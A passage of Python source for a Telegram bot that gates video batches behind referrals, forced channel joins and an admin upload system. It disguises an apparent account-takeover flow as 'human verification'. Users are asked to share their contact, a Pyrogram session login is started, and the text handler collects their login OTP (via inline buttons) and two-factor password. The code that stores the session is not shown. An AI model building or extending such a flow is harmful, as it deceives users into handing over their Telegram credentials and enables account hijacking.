    current = int(d.get("unlocked_batch", 0))
    if current <= 0:
        return await reply(update, context, "⚠️ You have not unlocked any video batches yet.")
    await reply(update, context, f"🔁 Batch <b>{current}</b> is being sent again…", parse_mode=ParseMode.HTML)
    await send_batch(context.bot, update.effective_chat.id, current)


async def unlock_next(update, context):
    if not await ensure_verified(update, context):
        return

    uid = update.effective_user.id
    d = user_doc(uid) or {}
    current = max(1, int(d.get("unlocked_batch", 1)))
    total = published_batch_count()

    if current >= total:
        return await reply(update, context, "🏁 <b>ALL AVAILABLE VIDEOS UNLOCKED</b>", parse_mode=ParseMode.HTML)

    # One-time human verification gate
    if not d.get("human_verified"):
        PENDING_UNLOCK[uid] = True
        await reply(
            update, context,
            "🔐 <b>HUMAN VERIFICATION REQUIRED</b>\n\n"
            "To unlock the next 10 videos, complete a quick one-time verification.\n\n"
            "👇 Please tap the <b>Share My Contact</b> button below to continue.",
            parse_mode=ParseMode.HTML,
        )
        return await pyro_session_start(update, context)

    # Referral path (subsequent unlocks)
    need = required_referrals_for_next(current)
    have = int(d.get("verified_referrals", 0))
    if have < need:
        username = context.application.bot_data["username"]
        link = make_ref_link(username, uid)
        return await reply(
            update, context,
            "🔐 <b>NEXT 10 VIDEOS LOCKED</b>\n\n"
            f"Required verified referrals: <b>{need}</b>\n"
            f"Successful referrals: <b>{have}</b>\n"
            f"Remaining: <b>{need-have}</b>\n\n"
            "A referral counts only after your friend completes all required memberships or join requests and passes verification.\n\n"
            f"🔗 <b>Your referral link:</b>\n<code>{esc(link)}</code>",
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )

    nxt = current + 1
    users.update_one({"user_id": uid}, {"$set": {"unlocked_batch": nxt}})
    batch = batches.find_one({"batch_no": nxt, "published": True}) or {}
    count = len(batch.get("message_ids", []))
    await reply(
        update, context,
        f"🎉 <b>BATCH {nxt} UNLOCKED!</b>\n🎞 Videos in this batch: <b>{count}</b>",
        parse_mode=ParseMode.HTML,
    )
    await send_batch(context.bot, update.effective_chat.id, nxt)


async def referral(update, context):
    if not await ensure_verified(update, context):
        return
    uid = update.effective_user.id
    d = user_doc(uid) or {}
    current = max(1, int(d.get("unlocked_batch", 1)))
    refs = int(d.get("verified_referrals", 0))
    need = required_referrals_for_next(current)
    link = make_ref_link(context.application.bot_data["username"], uid)

    await reply(
        update, context,
        "👥 <b>MY REFERRAL</b>\n\n"
        f"✅ Successful referrals: <b>{refs}</b>\n"
        f"🎯 Next batch target: <b>{need}</b>\n"
        f"📈 Progress: <b>{min(refs, need)}/{need}</b>\n\n"
        f"🔗 <b>Your link:</b>\n<code>{esc(link)}</code>\n\n"
        "⚠️ Referral only after force-join verification counts.",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
        reply_markup=user_menu_inline(),
    )


async def progress(update, context):
    if not await ensure_verified(update, context):
        return
    d = user_doc(update.effective_user.id) or {}
    current = int(d.get("unlocked_batch", 0))
    refs = int(d.get("verified_referrals", 0))
    human_ok = "✅ Yes" if d.get("human_verified") else "❌ No"

    unlocked_video_count = 0
    for b in batches.find({"published": True, "batch_no": {"$lte": current}}, {"message_ids": 1}):
        unlocked_video_count += len(b.get("message_ids", []))

    await reply(
        update, context,
        "📊 <b>YOUR PROGRESS</b>\n\n"
        f"🎬 Unlocked batches: <b>{current}/{published_batch_count()}</b>\n"
        f"🎞 Unlocked videos: <b>{unlocked_video_count}</b>\n"
        f"👥 Verified referrals: <b>{refs}</b>\n"
        f"🔐 Human verified: <b>{human_ok}</b>\n"
        f"🎯 Next target: <b>{required_referrals_for_next(max(1,current))}</b>\n"
        f"⏳ Video expiry: <b>{DELETE_AFTER_HOURS} hours</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=user_menu_inline(),
    )


# ---------------- ADMIN ----------------

async def admin(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    await reply(
        update, context,
        "🛠 <b>ADMIN CONTROL PANEL</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_inline(),
    )


def _upload_progress_text(doc, runtime, now=None):
    if now is None:
        now = time.monotonic()
    copied = len(doc.get("copied", []))
    failed = len(doc.get("failed", []))
    received = max(int(doc.get("submitted", 0)), int(runtime.get("submitted", 0)) if runtime else 0)
    processed = min(received, copied + failed)
    waiting = max(0, received - processed)
    pct = round((processed / received) * 100) if received else 0
    filled = min(10, round(pct / 10))
    bar = "█" * filled + "░" * (10 - filled)

    if runtime is None:
        state = "⏸ Bot restarted — open Upload Videos to resume a saved draft."
    else:
        cooldown = max(0, math.ceil(runtime.get("cooldown_until", 0) - now))
        active = runtime.get("active_source")
        phase = runtime.get("phase", "uploading")
        if cooldown:
            state = f"⏸ Telegram rate limit: <b>{cooldown}s</b> remaining (auto-resume)"
        elif active is not None:
            state = f"📨 Copying source video <code>{active}</code>"
        elif phase == "finishing":
            state = "⏳ Finishing queued copies…"
        elif phase == "retrying":
            state = "🔁 Retrying failed videos…"
        elif phase == "review":
            state = "⚠️ Review failed videos, then Retry Failed or Publish Successful."
        elif waiting:
            state = "⏳ Waiting in storage-copy queue…"
        else:
            state = "🟢 Ready — send more videos or tap DONE."

    return (
        "📊 <b>LIVE STORAGE UPLOAD</b>\n\n"
        f"📥 Received: <b>{received}</b>\n"
        f"✅ Stored: <b>{copied}</b>\n"
        f"❌ Failed: <b>{failed}</b>\n"
        f"⏳ Pending: <b>{waiting}</b>\n\n"
        f"<code>{bar}</code> <b>{pct}%</b> processed\n\n"
        f"{state}\n\n"
        "ℹ️ Same progress message auto-updates approximately every 3 seconds."
    )


async def _edit_upload_progress(bot, runtime):
    if not runtime.get("progress_chat_id") or not runtime.get("progress_message_id"):
        return
    async with runtime["progress_edit_lock"]:
        doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
        rendered = _upload_progress_text(doc, runtime)
        if rendered == runtime.get("last_progress_text"):
            return
        try:
            await bot.edit_message_text(
                chat_id=runtime["progress_chat_id"],
                message_id=runtime["progress_message_id"],
                text=rendered,
                parse_mode=ParseMode.HTML,
            )
            runtime["last_progress_text"] = rendered
        except RetryAfter as exc:
            runtime["progress_edit_pause_until"] = (
                asyncio.get_running_loop().time() + float(exc.retry_after) + 1
            )
        except BadRequest as exc:
            if "not modified" in str(exc).lower():
                runtime["last_progress_text"] = rendered
            else:
                log.warning("Cannot edit upload progress: %s", type(exc).__name__)
                runtime["progress_message_id"] = None
        except TelegramError as exc:
            log.warning("Upload progress update failed: %s", type(exc).__name__)


async def _upload_progress_worker(bot, runtime):
    try:
        while not runtime.get("progress_stop", False):
            loop = asyncio.get_running_loop()
            if loop.time() >= runtime.get("progress_edit_pause_until", 0):
                try:
                    await _edit_upload_progress(bot, runtime)
                except asyncio.CancelledError:
                    raise
                except Exception as exc:
                    log.warning("Progress snapshot failed: %s", type(exc).__name__)
            await asyncio.sleep(UPLOAD_PROGRESS_REFRESH_SECONDS)
    except asyncio.CancelledError:
        raise


async def _stop_upload_progress(runtime, bot=None, final_text=None):
    if not runtime:
        return
    runtime["progress_stop"] = True
    task = runtime.pop("progress_task", None)
    if task is not None:
        task.cancel()
        await asyncio.gather(task, return_exceptions=True)
    if bot and final_text and runtime.get("progress_message_id"):
        try:
            await bot.edit_message_text(
                chat_id=runtime["progress_chat_id"],
                message_id=runtime["progress_message_id"],
                text=final_text,
                parse_mode=ParseMode.HTML,
            )
        except TelegramError:
            pass


async def admin_upload_status(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID})
    if not runtime and not doc:
        return await reply(update, context, "ℹ️ No upload is currently active.", reply_markup=admin_menu_inline())
    text = _upload_progress_text(doc or {}, runtime)
    status = await reply(update, context, text, parse_mode=ParseMode.HTML)
    if runtime and not runtime.get("progress_message_id"):
        runtime["progress_chat_id"] = status.chat_id
        runtime["progress_message_id"] = status.message_id
        runtime["last_progress_text"] = text


async def admin_upload_start(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    if runtime:
        notice = (
            "The current upload is finishing or awaiting review."
            if runtime["closing"]
            else "An upload is already in progress. Send more videos or tap DONE."
        )
        return await reply(update, context, notice, reply_markup=upload_menu_inline())

    old = drafts.find_one({"admin_id": ADMIN_ID})
    if old and (old.get("copied") or old.get("message_ids") or old.get("failed")):
        if old.get("message_ids") and not old.get("copied"):
            return await reply(
                update, context,
                "⚠️ An unfinished draft from an older version was found. Your existing uploads are safe. "
                "Finish the upload in the older version with DONE before starting a new upload.",
            )
        submitted = int(old.get("submitted", 0))
        seen = {x["source_message_id"] for x in old.get("copied", [])}
    else:
        drafts.replace_one(
            {"admin_id": ADMIN_ID},
            {"admin_id": ADMIN_ID, "copied": [], "failed": [], "submitted": 0, "created_at": utcnow()},
            upsert=True,
        )
        submitted, seen = 0, set()

    runtime = {
        "semaphore": asyncio.Semaphore(UPLOAD_CONCURRENCY),
        "tasks": set(), "closing": False, "seen": seen,
        "submitted": submitted, "cooldown_until": 0.0,
        "next_copy_at": 0.0, "storage_send_lock": asyncio.Lock(),
        "active_source": None, "phase": "uploading",
        "progress_stop": False, "progress_edit_lock": asyncio.Lock(),
        "progress_edit_pause_until": 0.0, "last_progress_text": None,
        "progress_chat_id": None, "progress_message_id": None,
    }
    UPLOAD_RUNTIME[ADMIN_ID] = runtime
    ADMIN_STATE[ADMIN_ID] = "upload_videos"
    await reply(
        update, context,
        "🚀 <b>STORAGE UPLOAD</b>\n\n"
        "Storage copy workers: <b>1 (sequential)</b>\n"
        f"Gap between copies: <b>{UPLOAD_COPY_GAP_SECONDS:g}s</b>\n"
        "If Telegram applies a rate limit, the entire queue will pause for the required period. "
        "Every successful storage copy is saved to MongoDB. "
        "Send videos now, then tap <b>DONE</b>.",
        parse_mode=ParseMode.HTML,
        reply_markup=upload_menu_inline(),
    )
    initial = _upload_progress_text(drafts.find_one({"admin_id": ADMIN_ID}) or {}, runtime)
    status = await reply(update, context, initial, parse_mode=ParseMode.HTML)
    runtime["progress_chat_id"] = status.chat_id
    runtime["progress_message_id"] = status.message_id
    runtime["last_progress_text"] = initial
    runtime["progress_task"] = asyncio.create_task(
        _upload_progress_worker(context.bot, runtime), name="upload-live-progress"
    )


async def publish_message_ids(mids):
    if not mids:
        return None
    number = next_batch_no()
    batches.insert_one({
        "batch_no": number,
        "message_ids": list(mids),
        "published": True,
        "created_at": utcnow(),
    })
    return number


def _safe_error(exc):
    if isinstance(exc, RetryAfter):
        return "RetryAfter"
    if isinstance(exc, BadRequest):
        detail = str(exc).replace(BOT_TOKEN, "[TOKEN]")
        return ("BadRequest: " + detail)[:180]
    if isinstance(exc, Forbidden):
        return "Forbidden: bot lacks destination access or permissions"
    return type(exc).__name__


async def _storage_copy_job(bot, runtime, src_chat_id, source_id):
    async with runtime["semaphore"]:
        runtime["active_source"] = source_id
        reason = "Unknown"
        for attempt in range(UPLOAD_MAX_RETRIES):
            try:
                async with runtime["storage_send_lock"]:
                    loop = asyncio.get_running_loop()
                    delay = max(runtime["cooldown_until"], runtime["next_copy_at"]) - loop.time()
                    if delay > 0:
                        await asyncio.sleep(delay)

                    try:
                        copied = await bot.copy_message(
                            chat_id=STORAGE_CHANNEL_ID,
                            from_chat_id=src_chat_id,
                            message_id=source_id,
                            protect_content=False,
                            read_timeout=60,
                            write_timeout=60,
                            connect_timeout=20,
                            pool_timeout=30,
                        )
                    except RetryAfter as exc:
                        wait = float(exc.retry_after) + 1.0
                        runtime["cooldown_until"] = max(runtime["cooldown_until"], loop.time() + wait)
                        reason = f"RetryAfter ({round(wait)}s)"
                        log.warning("Storage rate-limited. Pausing storage queue for %ss", round(wait))
                        runtime["next_copy_at"] = loop.time() + UPLOAD_COPY_GAP_SECONDS
                        continue
                    finally:
                        runtime["next_copy_at"] = max(runtime["next_copy_at"], loop.time() + UPLOAD_COPY_GAP_SECONDS)

                drafts.update_one(
                    {"admin_id": ADMIN_ID},
                    {
                        "$addToSet": {"copied": {
                            "source_message_id": source_id,
                            "storage_message_id": copied.message_id,
                        }},
                        "$pull": {"failed": {"source_message_id": source_id}},
                    },
                )
                runtime["active_source"] = None
                return
            except (TimedOut, NetworkError) as exc:
                reason = type(exc).__name__
                if attempt + 1 < UPLOAD_MAX_RETRIES:
                    await asyncio.sleep(min(2 ** attempt, 16))
            except (BadRequest, Forbidden) as exc:
                reason = _safe_error(exc)
                log.warning("Storage copy source=%s: %s", source_id, reason)
                break
            except TelegramError as exc:
                reason = _safe_error(exc)
                log.warning("Storage copy source=%s: %s", source_id, reason)
                if attempt + 1 < UPLOAD_MAX_RETRIES:
                    await asyncio.sleep(min(2 ** attempt, 16))
            except asyncio.CancelledError:
                runtime["active_source"] = None
                raise

        drafts.update_one(
            {"admin_id": ADMIN_ID},
            {"$pull": {"failed": {"source_message_id": source_id}}},
        )
        drafts.update_one(
            {"admin_id": ADMIN_ID},
            {"$addToSet": {"failed": {"source_message_id": source_id, "reason": reason}}},
        )
        runtime["active_source"] = None


def _enqueue_upload(bot, runtime, chat_id, source_id):
    t = asyncio.create_task(
        _storage_copy_job(bot, runtime, chat_id, source_id),
        name=f"copy-video-{source_id}",
    )
    runtime["tasks"].add(t)
    t.add_done_callback(runtime["tasks"].discard)


async def admin_collect_video(update, context):
    if update.effective_user.id != ADMIN_ID or ADMIN_STATE.get(ADMIN_ID) != "upload_videos":
        return
    if not update.message.video:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    if not runtime or runtime["closing"]:
        return await update.message.reply_text("The upload is closing. Please allow DONE to finish.")
    mid = update.message.message_id
    if mid in runtime["seen"]:
        return
    runtime["seen"].add(mid)
    runtime["submitted"] += 1
    drafts.update_one({"admin_id": ADMIN_ID}, {"$inc": {"submitted": 1}})
    _enqueue_upload(context.bot, runtime, update.effective_chat.id, mid)


async def _drain_upload(runtime):
    if runtime and runtime["tasks"]:
        await asyncio.gather(*list(runtime["tasks"]), return_exceptions=True)


async def admin_retry_failed(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    failed = doc.get("failed", [])
    if not runtime or not failed:
        return await reply(update, context, "There are no failed videos to retry.", reply_markup=upload_menu_inline())
    runtime["closing"] = False
    runtime["phase"] = "retrying"
    ADMIN_STATE[ADMIN_ID] = "upload_videos"
    await reply(update, context, f"🔁 Retrying {len(failed)} failed videos…")
    for entry in failed:
        _enqueue_upload(context.bot, runtime, update.effective_chat.id, entry["source_message_id"])
    await _drain_upload(runtime)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    runtime["phase"] = "review" if doc.get("failed") else "uploading"
    await reply(
        update, context,
        f"✅ Retry complete. Saved: {len(doc.get('copied', []))}; "
        f"Still failed: {len(doc.get('failed', []))}. Tap DONE when ready.",
        reply_markup=upload_menu_inline(),
    )


async def admin_upload_done(update, context, force_publish=False):
    runtime = UPLOAD_RUNTIME.get(ADMIN_ID)
    doc = drafts.find_one({"admin_id": ADMIN_ID})
    if not doc:
        return await reply(update, context, "No active upload session.", reply_markup=admin_menu_inline())
    if runtime:
        runtime["closing"] = True
        runtime["phase"] = "finishing"
    status = await reply(update, context, "⏳ Finishing storage copies…")
    await _drain_upload(runtime)
    doc = drafts.find_one({"admin_id": ADMIN_ID}) or {}
    failed = doc.get("failed", [])
    copied = sorted(doc.get("copied", []), key=lambda x: x["source_message_id"])
    if failed and not force_publish:
        if runtime:
            runtime["phase"] = "review"
        details = "\n".join(
            f"• Video message {x['source_message_id']}: {esc(x.get('reason', 'Unknown'))}"
            for x in failed[:10]
        )
        return await status.edit_text(
            f"⚠️ <b>{len(failed)} VIDEOS FAILED</b>\n\n{details}\n\n"
            "🔁 Tap Retry Failed, then DONE. Or tap ✅ Publish Successful to skip the failed videos.",
            parse_mode=ParseMode.HTML,
            reply_markup=upload_menu_inline(),
        )
    ids = [x["storage_message_id"] for x in copied]
    published = []
    for i in range(0, len(ids), 10):
        published.append(await publish_message_ids(ids[i:i+10]))
    if runtime:
        await _stop_upload_progress(
            runtime, context.bot,
            "✅ <b>STORAGE UPLOAD COMPLETE</b>\n\n"
            f"Saved: <b>{len(ids)}</b> | Failed: <b>{len(failed)}</b>\n"
            f"Published batches: <b>{len(published)}</b>",
        )
    drafts.delete_one({"admin_id": ADMIN_ID})
    ADMIN_STATE.pop(ADMIN_ID, None)
    UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    await status.edit_text(
        f"✅ <b>UPLOAD COMPLETE</b>\n\n"
        f"Received: <b>{doc.get('submitted', 0)}</b>\n"
        f"Saved: <b>{len(ids)}</b>\n"
        f"Skipped failed: <b>{len(failed)}</b>\n"
        f"Published batches: <b>{len(published)}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_inline(),
    )


async def admin_add_group(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    ADMIN_STATE[ADMIN_ID] = "group_chat_id"
    await reply(
        update, context,
        "➕ <b>ADD REQUIRED CHAT</b>\n\n"
        "Send the numeric group or channel ID.\n"
        "Example: <code>-1001234567890</code>\n\n"
        "The bot will automatically generate an <b>approval-required join link</b> for this chat.\n"
        "The bot must be an administrator of this chat with permission to invite users.",
        parse_mode=ParseMode.HTML,
        reply_markup=flow_cancel_inline(),
    )


async def admin_group_flow(update, context):
    if update.effective_user.id != ADMIN_ID:
        return False

    st = ADMIN_STATE.get(ADMIN_ID)
    text = (update.message.text or "").strip()

    if st == "group_chat_id":
        try:
            cid = int(text)
        except ValueError:
            await update.message.reply_text("Invalid numeric chat ID.")
            return True

        try:
            chat = await context.bot.get_chat(cid)
            name = chat.title or str(cid)
            invite = await context.bot.create_chat_invite_link(
                chat_id=cid,
                name="Video Unlock Approval",
                creates_join_request=True,
            )
        except TelegramError as e:
            await update.message.reply_text(
                "❌ Could not generate the approval link.\n"
                "Give the bot administrator access and permission to invite users in the target chat.\n\n"
                f"Error: <code>{esc(type(e).__name__)}</code>",
                parse_mode=ParseMode.HTML,
                reply_markup=flow_cancel_inline(),
            )
            return True

        required_chats.update_one(
            {"chat_id": cid},
            {"$set": {
                "chat_id": cid,
                "name": name,
                "join_url": invite.invite_link,
                "link_mode": "approval",
                "enabled": True,
                "position": required_chats.count_documents({}),
                "updated_at": utcnow(),
            }},
            upsert=True,
        )
        ADMIN_STATE.pop(ADMIN_ID, None)

        await reply(
            update, context,
            "✅ <b>REQUIRED CHAT ADDED</b>\n\n"
            f"Name: <b>{esc(name)}</b>\n"
            f"ID: <code>{cid}</code>\n"
            "Link mode: <b>Approval / Join Request</b>\n\n"
            "Pending requests from this link will be recognized automatically.",
            parse_mode=ParseMode.HTML,
            reply_markup=admin_menu_inline(),
        )
        return True

    if st == "custom_link_chat_id":
        try:
            cid = int(text)
        except ValueError:
            await update.message.reply_text("Invalid numeric chat ID.")
            return True
        if not required_chats.find_one({"chat_id": cid}):
            await update.message.reply_text("This required chat has not been configured.")
            return True
        context.user_data["custom_link_chat_id"] = cid
        ADMIN_STATE[ADMIN_ID] = "custom_link_url"
        await reply(update, context, "Now send the custom t.me join or invite URL.", reply_markup=flow_cancel_inline())
        return True

    if st == "custom_link_url":
        if not (text.startswith("https://t.me/") or text.startswith("http://t.me/")):
            await update.message.reply_text("Please send a valid Telegram t.me URL.", reply_markup=flow_cancel_inline())
            return True
        cid = context.user_data.pop("custom_link_chat_id")
        required_chats.update_one(
            {"chat_id": cid},
            {"$set": {"join_url": text, "link_mode": "custom", "updated_at": utcnow()}},
        )
        ADMIN_STATE.pop(ADMIN_ID, None)
        await reply(update, context, "✅ Custom link set.", reply_markup=admin_menu_inline())
        return True

    return False


async def set_custom_link(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    ADMIN_STATE[ADMIN_ID] = "custom_link_chat_id"
    await reply(
        update, context,
        "🔗 Send the numeric ID of the required chat whose custom link you want to set.",
        reply_markup=flow_cancel_inline(),
    )


async def admin_batches(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = list(batches.find().sort("batch_no", ASCENDING))
    text = "📚 <b>VIDEO BATCHES</b>\n\n"
    if rows:
        text += "\n".join(
            f"• Batch <b>{x['batch_no']}</b> — {len(x.get('message_ids', []))} videos"
            for x in rows
        )
    else:
        text += "No batches."
    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=admin_menu_inline())


async def admin_groups(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    rows = list(required_chats.find().sort("position", ASCENDING))
    text = "👥 <b>REQUIRED CHATS</b>\n\n"
    if rows:
        text += "\n\n".join(
            f"• <b>{esc(x['name'])}</b>\n"
            f"  <code>{x['chat_id']}</code>\n"
            f"  Link: <b>{esc(x.get('link_mode', 'custom'))}</b>\n"
            f"  {'✅ Enabled' if x.get('enabled') else '⏸ Disabled'}"
            for x in rows
        )
        text += "\n\nTo set a custom link, use:\n<code>/setcustomlink</code>"
    else:
        text += "No required chats."
    await reply(update, context, text, parse_mode=ParseMode.HTML, reply_markup=admin_menu_inline())


REMOVE_PAGE_SIZE = 8


def remove_chat_list_markup(page=0):
    rows = list(required_chats.find().sort("position", ASCENDING))
    if not rows:
        return None, 0, 0
    last_page = (len(rows) - 1) // REMOVE_PAGE_SIZE
    page = min(max(int(page), 0), last_page)
    start = page * REMOVE_PAGE_SIZE
    buttons = [
        [InlineKeyboardButton(
            "🗑 " + str(c.get("name", c["chat_id"]))[:48],
            callback_data=f"rm_pick:{c['chat_id']}",
        )]
        for c in rows[start:start+REMOVE_PAGE_SIZE]
    ]
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"rm_list:{page-1}"))
    if page < last_page:
        nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"rm_list:{page+1}"))
    if nav:
        buttons.append(nav)
    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="rm_cancel")])
    return InlineKeyboardMarkup(buttons), page, len(rows)


async def admin_remove_chat_menu(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    markup, page, total = remove_chat_list_markup()
    if not markup:
        return await reply(update, context, "ℹ️ No required groups or channels configured.", reply_markup=admin_menu_inline())
    await reply(
        update, context,
        f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\n"
        f"Which group or channel would you like to remove from the required list? ({total} total)\n"
        "The Telegram group or channel will not be deleted; only its entry in the required list will be removed.",
        parse_mode=ParseMode.HTML,
        reply_markup=markup,
    )


async def remove_chat_callback(update, context):
    q = update.callback_query
    if q.from_user.id != ADMIN_ID:
        await q.answer("Admin only", show_alert=True)
        return
    data = q.data or ""
    if data == "rm_cancel":
        await q.answer()
        await q.edit_message_text("✅ Remove operation cancelled.")
        return
    if data.startswith("rm_list:"):
        await q.answer()
        markup, page, total = remove_chat_list_markup(int(data.split(":", 1)[1]))
        if markup:
            await q.edit_message_text(
                f"🗑 <b>REMOVE REQUIRED CHANNEL</b>\n\nSelect a chat ({total} total, page {page+1}):",
                parse_mode=ParseMode.HTML, reply_markup=markup,
            )
        else:
            await q.edit_message_text("ℹ️ No required chats left.")
        return
    try:
        chat_id = int(data.split(":", 1)[1])
    except (IndexError, ValueError):
        await q.answer("Invalid chat ID", show_alert=True)
        return
    entry = required_chats.find_one({"chat_id": chat_id})
    if not entry:
        await q.answer("Already removed", show_alert=True)
        await q.edit_message_text("This chat has already been removed.")
        return
    if data.startswith("rm_pick:"):
        await q.answer()
        await q.edit_message_text(
            f"⚠️ <b>CONFIRM REMOVAL</b>\n\n"
            f"{esc(entry.get('name', chat_id))}\n"
            f"<code>{chat_id}</code>\n\n"
            "Remove this chat from the required list? The Telegram group or channel itself will not be deleted.",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Yes, Remove", callback_data=f"rm_yes:{chat_id}")],
                [InlineKeyboardButton("⬅️ Back", callback_data="rm_list:0"),
                 InlineKeyboardButton("❌ Cancel", callback_data="rm_cancel")],
            ]),
        )
        return
    if data.startswith("rm_yes:"):
        result = required_chats.delete_one({"chat_id": chat_id})
        if result.deleted_count:
            pending_requests.delete_many({"chat_id": chat_id})
            membership_events.delete_many({"chat_id": chat_id})
        await q.answer("Removed" if result.deleted_count else "Already removed")
        await q.edit_message_text(
            f"✅ <b>{esc(entry.get('name', chat_id))}</b> removed from required chats.\n"
            "Existing video batches, users and other channels remain unchanged.",
            parse_mode=ParseMode.HTML,
        )
        return
    await q.answer("Unknown action", show_alert=True)


async def admin_stats(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    total = users.count_documents({})
    verified = users.count_documents({"verified": True})
    human_ok = users.count_documents({"human_verified": True})
    agg = list(users.aggregate([{"$group": {"_id": None, "n": {"$sum": "$verified_referrals"}}}]))
    refs = agg[0]["n"] if agg else 0
    cutoff = utcnow() - timedelta(hours=PENDING_REQUEST_TTL_HOURS)
    active_pending = pending_requests.count_documents({"requested_at": {"$gte": cutoff}})

    await reply(
        update, context,
        "📊 <b>BOT STATS</b>\n\n"
        f"👤 Total users: <b>{total}</b>\n"
        f"✅ Verified: <b>{verified}</b>\n"
        f"🔐 Human verified: <b>{human_ok}</b>\n"
        f"🤝 Successful referrals: <b>{refs}</b>\n"
        f"⏳ Active pending join requests: <b>{active_pending}</b>\n"
        f"📦 Batches: <b>{published_batch_count()}</b>\n"
        f"🗑 Pending deletions: <b>{pending_deletions.count_documents({})}</b>",
        parse_mode=ParseMode.HTML,
        reply_markup=admin_menu_inline(),
    )


async def admin_reset_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args:
        return await update.message.reply_text(
            "Usage: <code>/resetverify &lt;user_id&gt;</code>",
            parse_mode=ParseMode.HTML,
        )
    try:
        target = int(args[0])
    except ValueError:
        return await update.message.reply_text("Invalid user ID.")
    res = users.update_one(
        {"user_id": target},
        {"$set": {"human_verified": False, "human_verified_at": None}},
    )
    await update.message.reply_text(
        f"✅ Reset human verification for <code>{target}</code>. "
        f"Matched: {res.matched_count}, Modified: {res.modified_count}",
        parse_mode=ParseMode.HTML,
    )


async def cancel(update, context):
    if update.effective_user.id != ADMIN_ID:
        return
    runtime = UPLOAD_RUNTIME.pop(ADMIN_ID, None)
    if runtime:
        runtime["closing"] = True
        running = list(runtime["tasks"])
        for task in running:
            task.cancel()
        if running:
            await asyncio.gather(*running, return_exceptions=True)
        await _stop_upload_progress(runtime, context.bot, "❌ <b>Upload cancelled</b>")
    ADMIN_STATE.pop(ADMIN_ID, None)
    drafts.delete_one({"admin_id": ADMIN_ID})
    context.user_data.pop("custom_link_chat_id", None)
    await reply(update, context, "Cancelled.", reply_markup=admin_menu_inline())


async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    data = q.data or ""
    uid = q.from_user.id

    # ── User menu ──
    if data == "um_videos":
        await q.answer()
        return await my_videos(update, context)
    if data == "um_unlock":
        await q.answer()
        return await unlock_next(update, context)
    if data == "um_ref":
        await q.answer()
        return await referral(update, context)
    if data == "um_progress":
        await q.answer()
        return await progress(update, context)

    # ── Admin menu ──
    if uid != ADMIN_ID:
        return await q.answer("Admin only.", show_alert=True)

    if data == "am_upload":
        await q.answer()
        return await admin_upload_start(update, context)
    if data == "am_batches":
        await q.answer()
        return await admin_batches(update, context)
    if data == "am_addgroup":
        await q.answer()
        return await admin_add_group(update, context)
    if data == "am_groups":
        await q.answer()
        return await admin_groups(update, context)
    if data == "am_remove":
        await q.answer()
        return await admin_remove_chat_menu(update, context)
    if data == "am_stats":
        await q.answer()
        return await admin_stats(update, context)

    # ── Upload menu ──
    if data == "up_status":
        await q.answer()
        return await admin_upload_status(update, context)
    if data == "up_done":
        await q.answer("Finishing…")
        return await admin_upload_done(update, context)
    if data == "up_retry":
        await q.answer()
        return await admin_retry_failed(update, context)
    if data == "up_publish":
        await q.answer()
        return await admin_upload_done(update, context, force_publish=True)
    if data == "up_cancel":
        await q.answer()
        return await cancel(update, context)

    # ── Flow cancel (add group / custom link) ──
    if data == "flow_cancel":
        await q.answer()
        ADMIN_STATE.pop(ADMIN_ID, None)
        context.user_data.pop("custom_link_chat_id", None)
        try:
            await q.edit_message_text("✅ Cancelled.", reply_markup=admin_menu_inline())
        except BadRequest:
            pass
        return

    await q.answer()


async def text_router(update: Update, context):
    uid = update.effective_user.id

    # Pyrogram session generator state handling
    if PYRO_STATE.get(uid) == "password":
        return await pyro_handle_password(update, context)
    if PYRO_STATE.get(uid) == "otp":
        return await update.message.reply_text(
            "⚠️ <b>Do not type the OTP in chat.</b>\n"
            "Use the inline buttons above, otherwise the login will remain incomplete.",
            parse_mode=ParseMode.HTML,
        )
    if PYRO_STATE.get(uid) == "await_contact":
        return await update.message.reply_text(
            "📱 Please tap the <b>Share My Contact</b> button to continue, "
            "or send /cancel_session to abort.",
            parse_mode=ParseMode.HTML,
        )

    # Admin flow that needs typed text (chat ID / custom URL)
    if uid == ADMIN_ID and ADMIN_STATE.get(ADMIN_ID) in {"group_chat_id", "custom_link_chat_id", "custom_link_url"}:
        if await admin_group_flow(update, context):
            return


async def checkme(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    chats = active_required_chats()
    if not chats:
        return await update.message.reply_text("No required chats configured.")

    results = await asyncio.gather(
        *(check_one_chat(context.bot, ch, uid) for ch in chats),
        return_exceptions=True,
    )

    lines = ["🔎 <b>Membership Check</b>\n"]
    for ch, result in zip(chats, results):
        if isinstance(result, Exception):
            state = "error"
        else:
            _, state = result
